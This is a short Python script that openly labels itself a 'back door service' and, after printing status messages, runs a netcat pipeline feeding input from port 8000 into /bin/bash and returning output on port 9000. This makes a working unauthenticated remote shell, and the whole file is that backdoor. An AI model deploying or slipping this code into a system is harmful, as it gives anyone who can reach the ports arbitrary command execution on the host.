import os
import time
import random
time.sleep(1)
print("[+] Starting tcp server")
time.sleep(0.4)
print("[+] Starting back door service")
time.sleep(0.2)
print("[Info] Open a terminal and type: nc 127.0.0.1 8000 ")
print("[Info] Open a second terminal and type: nc 127.0.0.1 9000 ")
os.system('nc -l 8000 | /bin/bash | nc -l 9000')
time.sleep(1)
